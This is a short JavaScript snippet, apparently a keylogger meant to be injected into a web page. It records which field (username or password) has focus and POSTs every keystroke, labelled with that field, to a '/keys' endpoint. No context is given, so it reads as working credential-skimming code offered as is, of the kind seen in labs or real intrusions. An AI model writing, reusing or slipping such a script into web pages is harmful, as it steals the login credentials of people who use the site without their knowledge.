var form = "";
 
document.getElementById("username").addEventListener("focus", function() {
    form = "username";
});
 
document.getElementById("password").addEventListener("focus", function() {
    form = "password";
});
 
document.addEventListener('keydown', (event) => {
        var str = `${form}:${event.key}`
        fetch('/keys', {
                method: 'POST',
                body: str
        });
});
